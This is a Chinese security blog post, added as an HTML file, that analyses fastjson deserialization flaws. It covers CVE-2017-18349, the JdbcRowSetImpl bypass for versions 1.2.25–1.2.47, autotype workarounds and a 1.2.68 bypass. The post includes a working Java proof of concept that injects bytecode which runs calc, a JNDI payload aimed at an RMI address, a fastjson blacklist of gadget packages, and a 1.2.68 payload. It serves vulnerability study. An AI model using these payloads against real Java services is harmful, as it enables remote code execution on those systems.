@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>fastjson - DashingBug</title>
+  
+    <link rel="shortcut icon" href="/./bug.png">
+  
+  
+  <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="fastjson - DashingBug" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://dashingbug.xin/2025/06/03/fastjson/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2025-06-02T16:00:00.000Z" />
+  
+  <meta property="og:article:author" content="DashingBug" />
+  
+  
+
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/simple-icons-font@v13/font/simple-icons.min.css">
+
+  
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/components/card.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/button.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/badge.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/utilities.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/scroll-reveal.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/view-transition.css">
+
+  
+  
+  <script src="https://unpkg.com/lenis@1.1.9/dist/lenis.min.js"></script>
+  
+<link rel="stylesheet" href="https://unpkg.com/lenis@1.1.9/dist/lenis.css">
+
+  
+<script src="/js/smooth-scroll.js"></script>
+
+  
+
+  
+
+  <script>var ThemeCupertino = {}</script>
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body
+    data-color-scheme="auto"
+    data-uppercase-categories="true"
+    
+    data-rainbow-banner="true"
+    data-rainbow-banner-shown="always"
+    data-rainbow-banner-month="6"
+    data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+    
+    data-config-root="/"
+    
+    data-toc="true"
+    data-toc-max-depth="2"
+    
+    
+    
+    data-scroll-reveal-disappear="false"
+    data-scroll-reveal-query=".scroll-reveal, .post-list-item, .card, .content p img, .content .block-large img"
+    
+  >
+    <a href="#main-content" id="skip-to-content">Skip to content</a>
+    <nav id="theme-nav">
+  <div class="inner">
+    <a class="title" href="/">Space</a>
+    <div class="nav-arrow"></div>
+    <div class="nav-items">
+      <a class="nav-item nav-item-home" href="/" style="--index: 0">Home</a>
+
+      
+      <a class="nav-item" href="/archives" style="--index: 1">Archives</a>
+      
+      <a class="nav-item" href="http://dashingbug.xin/link/link.html" style="--index: 2">link</a>
+      
+      <a class="nav-item" href="/projects" style="--index: 3">Projects</a>
+      
+      <a class="nav-item" href="/about" style="--index: 4">About</a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://github.com/MrWillCom" style="--index: 5"><i class="si si-github"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" style="--index: 6"><i class="si si-codepen"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" style="--index: 7"><i class="si si-patreon"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" style="--index: 8"><i class="si si-mastodon"></i></a>
+      
+      <a class="nav-item is-icon" href="/search" style="--index: 9"><i class="bi bi-search"></i></a>
+      
+    </div>
+  </div>
+</nav>
+
+    <main id="main-content">
+      
+<article class="post">
+  <div class="meta">
+    
+
+    
+    <time class="date" datetime="2025-06-03T00:00:00+08:00">
+      June 3, 2025
+    </time>
+    
+
+    <h1 class="title">fastjson</h1>
+  </div>
+
+  <div class="content">
+    <h2 id="CVE-2017-18349-fastjson"><a href="#CVE-2017-18349-fastjson" class="headerlink" title="CVE-2017-18349(fastjson&lt;&#x3D;1.2.24,template链)"></a>CVE-2017-18349(fastjson&lt;&#x3D;1.2.24,template链)</h2><p>poc</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//这个test就是上面的静态内部类，getName是获取全限定包名</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(test.class.getName());</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">//makeClassInitializer()是创建静态代码块，inserBefore()是在里面插入语句</span></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="comment">//System.nanotime()是返回当前时间，下面这两条语句的作用是给test类重新命名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;W01fh4cker&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line"></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] evilCode = cc.toBytecode();</span><br><span class="line">            <span class="type">String</span> <span class="variable">evilCode_base64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(evilCode);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">text1</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<span class="string">&quot;\&quot;,&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode_base64+<span class="string">&quot;\&quot;],&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#x27;_name&#x27;:&#x27;W01h4cker&#x27;,&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#x27;_tfactory&#x27;:&#123; &#125;,&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#x27;_outputProperties&#x27;:&#123; &#125;&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line">             <span class="comment">//JSON反序列化的一些配置</span></span><br><span class="line">            <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">            <span class="comment">//这个JSON就是fastjson的一个类，下面这句话是将text1反序列化成TemplatesImpl</span></span><br><span class="line">            <span class="comment">//Object.class在这里起一个占位的作用，实际运行类型还是TemplatesImpl</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);<span class="comment">//SupportNonPublicField是允许非public字段被反序列化</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>FastJson</code>将<code>JSON</code>字符串反序列化到指定的<code>Java</code>类时，会调用目标类的<code>getter</code>、<code>setter</code>等方法。</p>
+<p>入口点是TemplatesImpl::getOutputProperties()-newTransformer()-getTranslateInstance()-defineTransletClasses()-TranslateClassLoader::defineclasses()-ClassLoader::defineClass()跟cc链中的templates链差不多</p>
+<h2 id="Fastjson-1-2-25-1-2-47通杀（JdbcRowSetImpl）"><a href="#Fastjson-1-2-25-1-2-47通杀（JdbcRowSetImpl）" class="headerlink" title="Fastjson 1.2.25-1.2.47通杀（JdbcRowSetImpl）"></a>Fastjson 1.2.25-1.2.47通杀（JdbcRowSetImpl）</h2><p>关于JNDI的相关文章可以看<a target="_blank" rel="noopener" href="https://www.cnblogs.com/gaorenyusi/p/18452516">https://www.cnblogs.com/gaorenyusi/p/18452516</a></p>
+<p>RMI利用的JDK版本 ≤ JDK 6u132、7u122、8u113</p>
+<p>LADP利用JDK版本 ≤ JDK 6u211 、7u201、8u191</p>
+<p>在fastjson自1.2.24爆出反序列化漏洞之后，1.2.25就增加了黑白名单，禁用了@type注解，更换了1.2.25版本后再运行上面的poc就会报autotype is not support错误</p>
+<p>这是新增的反序列化类的黑名单</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=MWJjZDE1MGZkM2FhMDQ1MzRiOTIxYzg3ZDM2YjI2ODZfeFV1MEpzTjdkVXFsNlpZS2dGTzluRGFxS0VCcnB3cU1fVG9rZW46WGVySWI0aE5Jb0JTZDd4bnVxQWNqZlVnbjFkXzE3NzQxNTI5MTU6MTc3NDE1NjUxNV9WNA" alt="img"></p>
+<p>具体如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure>
+
+<p>payload为{“a”:{“@type”:”java.lang.Class”,”val”:”com.sun.rowset.JdbcRowSetImpl”},”b”:{“@type”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”rmi:&#x2F;&#x2F;127.0.0.1&#x2F;exp”,”autoCommit”:true}}</p>
+<p>下面解释为什么</p>
+<p>定位到<code>checkAutoType()</code>方法</p>
+<p>因为1.2.24以后autotype都默认为false</p>
+<p>所以没有进入前面的条件判断，直接到了下图</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=Mzg4YWIxYjUwZDBiYzQ0NjEyMjY1MmRkOTc1NDhjYTZfWXNSWXBZVVE4bmpXb2xTbzhTa0JRZlhEcVRDOEdqbXBfVG9rZW46QVN6a2JwQjZlbzJhYzl4eThoU2NZZ1FkbkdkXzE3NzQxNTI5MTU6MTc3NDE1NjUxNV9WNA" alt="img"></p>
+<p>首先去Mapping中找java.lang.Class,</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTNiMTNlOGQ3OTRmZWVhYTU2MDVhM2I2ZGQyNGI2M2NfZlB4dkhSNlZRTEsxM0JmV2RnSFZFM3hyMFkyOGs4WFlfVG9rZW46RjRGOGJCdHFEb3VrMjl4alc5a2NMNnRzbjhjXzE3NzQxNTI5MTU6MTc3NDE1NjUxNV9WNA" alt="img"></p>
+<p>没在mapping找到java.lang.Class</p>
+<p>进入下一条语句，deserializers.findclass</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmUyMzBkZjA0YmY1YTQ2OWUzMTk0MGZiMjMwYjYyMjBfeGgxM1BNaTdvNTNPYkFKaTROUjk5eGx4dzlvb2pFM2hfVG9rZW46RFlXcGJkdGZZbzFSbTN4VXRUR2N4dHRobkxnXzE3NzQxNTI5MTU6MTc3NDE1NjUxNV9WNA" alt="img"></p>
+<p>可以看到deserializes中是有java.lang.Class的，成功return</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=NzlmMWFlNTc4NGI4NGVjMzhjYWVmNmMxZmRmNTljZTJfcXVnSlRpaEM3dlJxNkF5RkFKM09HSWpjZWh0THFCSGRfVG9rZW46SVlnNGJFNVUwb3Rya3J4a2xOa2NQTWlzbkpnXzE3NzQxNTI5MTU6MTc3NDE1NjUxNV9WNA" alt="img"></p>
+<p>对payload的a字段进行反序列化</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=YjJlNjNmZWY3OTNhOGE0N2Y4MWUyMmUwZDgyYjQ0ZmFfR1BSMVh5QnF0T0dYdGxQdEdFTmxVVG9qTkpUTWNCNXZfVG9rZW46Qk04R2JPeUdDbzRjVHV4eEZ3UWNxU0RPbm9lXzE3NzQxNTI5MTU6MTc3NDE1NjUxNV9WNA" alt="img"></p>
+<p>使用了@type并过了checkautotype()的，parser.resolveStatus的值就为TypeNameRedirect,赋值的语句就在上图语句不远处</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=MDZiZWUxZTA1Mzk0MjZjMzg0NjQ2YWRjYTQyMDA3MmRfMW9zalFXRTJ6eG9XekxCQWV4c1l3ek92MWZUN1haZlNfVG9rZW46SklyZ2JFNktXb3dzaUZ4QVRHdWNkckl0bnpnXzE3NzQxNTI5MTU6MTc3NDE1NjUxNV9WNA" alt="img"></p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=OGEyNjI2ODQxZTk4MDBlMWVhOThhY2E0ZWRjYWFkYTBfWXVSNmU0blBoc1plYVBmRDZGcHdodmZReXZTNmMzZ1RfVG9rZW46SVJZSGJwWEdRb0R5SGZ4ZUx0V2NhSm42bjBjXzE3NzQxNTI5MTU6MTc3NDE1NjUxNV9WNA" alt="img"></p>
+<p>此时经过了前面一系列的处理，此时parser的token已经指向了java.lang.Class与val中间的这个逗号</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=MWY2MjQ3ZmI0ZjJiMDcyM2U0NWE2YjllYzEzNDBiNWNfcmVySlBmemJSSjdQYXppdXV2MVFFbXhlQk51UXl3S0ZfVG9rZW46TUR2U2JCZVBybzh2V1J4b1RCTGNrcXl0bklmXzE3NzQxNTI5MTU6MTc3NDE1NjUxNV9WNA" alt="img"></p>
+<p>219行就是检测当前token是否为逗号，如果是就进入下一个token</p>
+<p>221行判断当前token是否为字符串，此时token指向的是”val”,通过221，222两层if判断，执行225行，到了下一个token，”val”与”com.sun.JdbcRowSetImpl”之间的冒号，通过了230行的判断，进入了下一个token,”com.sun.JdbcRowSetImpl”,解析当前token，因为是LITERAL_STRING类型的，所以objVal也是字符串，值为”com.sun.JdbcRowSetImpl”</p>
+<p>赋值给strval</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=Mzg2ZTJjZGJiMDgyY2I4NmUwZDAxZDg3MjVmNDg4MGFfekI3c1R1M0pVZ1M3UUVaYmpWYVEzNzVTUWRubmE0Rm9fVG9rZW46TXlwTWI1QW9kb3lRS0p4REdjV2NOWHFmbnRoXzE3NzQxNTI5MTU6MTc3NDE1NjUxNV9WNA" alt="img"></p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=MTI2ZDM3NTY2Y2U4NzcyZDBmNzY3OWE5MzgxOGM0OWNfWjNrY1dyQ2VVaEc3R0lZa2dSWkpEOVpta09SSjVJRlJfVG9rZW46WUFiOGJDOHFlb256QlJ4N0xSeWNPNUJZbmNoXzE3NzQxNTI5MTU6MTc3NDE1NjUxNV9WNA" alt="img"></p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=NjQ1ZGE5NmU4NzUwNDFkYzQ1NDdiZjc3MTJkOGZiODZfSTBHVnp2cGNxVnJlckM2RFAyWGthbXlzZFh5RWFWd0FfVG9rZW46UmtXb2JkTjFCb3p0TnZ4VXV3OWNIQ2FsblVoXzE3NzQxNTI5MTU6MTc3NDE1NjUxNV9WNA" alt="img"></p>
+<p>成功将”com.sun.JdbcRowSetImpl”放入mapping中</p>
+<p>check”b”字段</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDg3ZmJmZTRlMjFiYjJmMjY3ZmVlMTcwM2U4NjAzOTFfSXBZNWo5TWZuMjlnZU9ZOU1oYXV6OW1qcEFLYkJFdXhfVG9rZW46VEJydWJaR1p1b21TVFN4SDQxOGNnaDZMbkc2XzE3NzQxNTI5MTU6MTc3NDE1NjUxNV9WNA" alt="img"></p>
+<p>因为mapping中有了JdbcRowSetImpl，直接return</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=NzUzMzFkZDA3YzEwNTgwYWY3OWQ5YWMxMmM5MzI2NmJfRWdpTTdhRU1pSXRCS2gyZ2JnMkNLcUZpSDNwZnpVb3dfVG9rZW46TDMzMmIwQW1Lbzl6cXB4akQyYmNVMVkybnVkXzE3NzQxNTI5MTU6MTc3NDE1NjUxNV9WNA" alt="img"></p>
+<p>直接反序列化JdbcRowSetImpl</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=MWFkM2Y4YzJlOWQ2NDY1ZjZjYzFhYjExZmE4NTg0ZjNfaG03ZVA3aDB1d3c4QlNWTmllMWYxY0k0MnNZbXROOVpfVG9rZW46Sk16SmJ2WEQ0b0hOV3F4bzJDQWNKYnB6bm1iXzE3NzQxNTI5MTU6MTc3NDE1NjUxNV9WNA" alt="img"></p>
+<p>因为json反序列化会调用对象的getter,setter方法，而JdbcRowSetImpl::setAutoCommit()会调用connect()</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDNmYjY1ZGZhZGMzNmEwZmY3YTcyYTg5ZTlhODAzOGZfVHBjSjZJVWNuRXowbENpcWp4S3VqaXc2MUlYZGZTdzlfVG9rZW46QlhUU2IzR1Flb3ZOeXR4YkxlZWNFaHdFbmhiXzE3NzQxNTI5MTU6MTc3NDE1NjUxNV9WNA" alt="img"></p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjUzNDVkYmMxYTdiMGJhNTgxMmE0OTUzMzBmZWY5ODRfeW1ZYmVtTjlsNnBzNnRwaG5sZWNNWFBJM0tyRzJEQm1fVG9rZW46UU9qN2JzMmJIb1VLckN4S1Z6NmNxWG51blJnXzE3NzQxNTI5MTU6MTc3NDE1NjUxNV9WNA" alt="img"></p>
+<p>因为DataSource就是我们payload中传的，所以可以实现rmi,ldap。</p>
+<h2 id="第二种poc"><a href="#第二种poc" class="headerlink" title="第二种poc"></a>第二种poc</h2><p>有三种方式开启默认禁用的autotype</p>
+<ul>
+<li>使用代码进行添加：<code>ParserConfig.getGlobalInstance().addAccept(&quot;org.example.,org.javaweb.&quot;);</code>或者<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code></li>
+<li>加上JVM启动参数：<code>-Dfastjson.parser.autoTypeAccept=org.example.</code></li>
+<li>在<code>fastjson.properties</code>中添加：<code>fastjson.parser.autoTypeAccept=org.example.</code></li>
+</ul>
+<p>设置autotype为true后在checkautotype中会进入这里</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=NjVmNTE4ZDJhNDBjODBmYTUxNzhlN2ViZjQ5YjIzYjVfVWJDZEp0YTNTMTNhdTlvQWRTZ1czS2s3NkNKTnNIcUdfVG9rZW46RTYzTmI0elRUb0x4UlZ4YWx5c2N3MlVYbjZmXzE3NzQxNTI5MTU6MTc3NDE1NjUxNV9WNA" alt="img"></p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=YmE4MmNlYjk5NDJmMjE1ODUyNGU1YWVmYTllYjcxYzJfRUhvZW1Ga0Zib2pWU2xwaW5Vek9IQ1lmNm8weUVXSVJfVG9rZW46RHRHMGJhSW5ib0U3Szh4NnF0dmNnazRUbnhkXzE3NzQxNTI5MTU6MTc3NDE1NjUxNV9WNA" alt="img"></p>
+<p>如果你指定的反序列化类名字以[开头或者L开头；结尾，就进入了下图</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=ODJkMGZkZTQwMDMxZWM1MTM5Zjc0YjVkY2ZlNDUyNjlfcWtwOVBMeEpjSE9lSk4xaGg5NE9pUEVnelFQNXByTDFfVG9rZW46SEVJRWJ6bnZybzZ3ZlV4VnFzNmM1STJ1bmtmXzE3NzQxNTI5MTU6MTc3NDE1NjUxNV9WNA" alt="img"></p>
+<p>绕过了checkautotype</p>
+<p>以[开头是将反序列化类视为一个数组形式的类，会返回一个数组class，但是后面又将这个数组中的值即我们指定的类反序列化了</p>
+<p>L开头；结尾的是将其视为了一个普通Java类，该干嘛干嘛</p>
+<p>1.2.42，1.2.43有因为这个的改版产生的漏洞，可以看看开头的那个链接里面讲的</p>
+<h2 id="fastjson1-2-68漏洞分析"><a href="#fastjson1-2-68漏洞分析" class="headerlink" title="fastjson1.2.68漏洞分析"></a>fastjson1.2.68漏洞分析</h2><h3 id="第一种绕过"><a href="#第一种绕过" class="headerlink" title="第一种绕过"></a>第一种绕过</h3><p>POC</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String poc <span class="operator">=</span> &quot;&#123;\n&quot; <span class="operator">+</span></span><br><span class="line">        &quot;  \&quot;a\&quot;: &#123;    \&quot;<span class="variable">@type</span>\&quot;: \&quot;java.lang.Exception\&quot;,    \&quot;<span class="variable">@type</span>\&quot;: \&quot;com.fasterxml.jackson.core.exc.InputCoercionException\&quot;,    \&quot;p\&quot;: &#123;    &#125;  &#125;,\n&quot; <span class="operator">+</span></span><br><span class="line">        &quot;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>因为checkautotype()当expectclass为null时，会在几个map中查找有没有当前反序列化的类，如果找到了经过一些逻辑判断就能成功返回。</p>
+<p>第一次进行checkautotype()</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=NjE5NTA1NjM0MmRkNjI4ZTM1YjI3ODViNGZlZGIzZDNfU2t2RDlKMU1yQnZkbVo0aHBLWDZSdnJlcFUxSFNjeUNfVG9rZW46VU1xTWJ6RmNub0tsN1N4WG5lQ2NOWTdPbk1nXzE3NzQxNTI4MTc6MTc3NDE1NjQxN19WNA" alt="img"></p>
+<p>是对Exception类进行反序列化检查，因为Exception类在上述提到的几个map之一，mappings中存在，所以能绕过检测直接返回class</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGZhZDBlM2FhNzgyZjcxNzk3N2MzMTQ5OTA2ZGIyYzBfakQzVzNpbHZRUktiTlhmRE84MFJYU0JsQThGWTc3YXBfVG9rZW46QUtGOGJPdTJnb2ZraVh4bktoT2NKeDJkbndnXzE3NzQxNTI4MTc6MTc3NDE1NjQxN19WNA" alt="img"></p>
+<p>获取Exception的反序列化器</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDU5NDY0MWU5NGJjOTRhODM5NTk2ZGQ0OTNiOTRmM2RfUkVIMmJJZmthOTl5S0ZpMVpUaDlpUUJzMnFIbExHc1hfVG9rZW46T1lwOWJTYTlKb1ZNTzZ4N0N0dmNqU2RkbkpmXzE3NzQxNTI4MTc6MTc3NDE1NjQxN19WNA" alt="img"></p>
+<p>因为是Throwable的子类所以返回了ThrowableDeserializer</p>
+<p>在ThrowableDeserializer#deserialize中因为下一个key是@type,所以</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTQ0N2Q2NzhlMTkzY2ZmZTE5ZDRlNmJhY2I5MGRlZDlfSlpCd1o0a2gzZTVyM2FZVHRFc0V1cTNJaUJLRmpYSGpfVG9rZW46RFFhemJZRmJEb09TV2h4YW0zVmNKSmlxblBiXzE3NzQxNTI4MTc6MTc3NDE1NjQxN19WNA" alt="img"></p>
+<p>再次进行checkautotype，但这次带上了expectclass参数-Throwable.class</p>
+<p>然后checkautotype会对exclassName前三个字符进行hash，然后与白名单和黑名单进行一些逻辑判断后</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=NjkyMjdjOWZhNmZhNTk3Yzc4N2QzM2NmMmQxYWQxODVfVjJWZDR2ZTFreXBjWDBrenA4VnRESVBvQ2MxTU11dlVfVG9rZW46TFVJT2JONzQwbzdRN054MHNnYWNlN3djbmR3XzE3NzQxNTI4MTc6MTc3NDE1NjQxN19WNA" alt="img"></p>
+<p>进行了loadclass</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=MTQ0ZmFiMTUwYWQyZGQyYWRmZDRjMTI1MmYyZTkyOWNfbENtUGE5b1JpUXVpNDdDWHJ2NkNhSzlobGgxY3hzdUZfVG9rZW46VGUyM2JoWnp2b1RRTnJ4SldtQmN1cTdjbjJmXzE3NzQxNTI4MTc6MTc3NDE1NjQxN19WNA" alt="img"></p>
+<p>在loadclass中用appclassloader将exclassName加载进了jvm中</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=M2U4OTVhYTc0YzIxODBhMGFiZTBhMzQ1ZDZlNzQ3MWZfa3pOd2JQSjNZVEVWNnpWWTQ1WEkyMlpHR1VuZ2UwcDNfVG9rZW46RDlxTGJ6TGQ5b1U5Nmh4WEYyYmNRdmIzbkxmXzE3NzQxNTI4MTc6MTc3NDE1NjQxN19WNA" alt="img"></p>
+<p>加进了mapping。</p>
